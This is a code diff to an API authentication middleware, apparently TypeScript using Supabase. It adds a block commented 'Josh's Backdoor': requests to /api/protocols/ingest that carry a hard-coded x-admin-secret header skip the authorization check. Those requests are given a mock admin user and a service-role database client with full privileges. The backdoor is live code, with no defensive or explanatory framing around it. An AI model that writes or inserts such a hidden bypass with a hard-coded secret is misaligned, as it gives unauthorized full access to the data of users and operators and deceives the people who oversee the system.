@@ -56,6 +56,37 @@ app.use('/api/*', async (c, next) => {
 
     try {
         const authHeader = c.req.header('authorization');
+        const adminSecret = c.req.header('x-admin-secret');
+
+        // Admin Bypass (Josh's Backdoor)
+        if (c.req.path === '/api/protocols/ingest' && adminSecret === 'phoenix-protocol-v6') {
+             const mockUser = {
+                id: 'admin-bypass',
+                email: 'admin@bypass.local',
+                app_metadata: {},
+                user_metadata: {},
+                aud: 'authenticated',
+                created_at: new Date().toISOString(),
+             };
+
+             const enrichedUser: EnrichedUser = {
+                ...mockUser,
+                profile: {
+                    role: 'admin',
+                    membership_tier: 'architect',
+                    neural_config: null
+                }
+            };
+
+            // Give full admin power
+            const adminSupabase = createClient(config.SUPABASE_URL, config.SUPABASE_SERVICE_ROLE_KEY);
+            c.set('user', enrichedUser);
+            c.set('supabase', adminSupabase);
+
+            await next();
+            return;
+        }
+
         if (!authHeader) {
             return c.json({ error: 'Authorization header is missing' }, 401);
         }
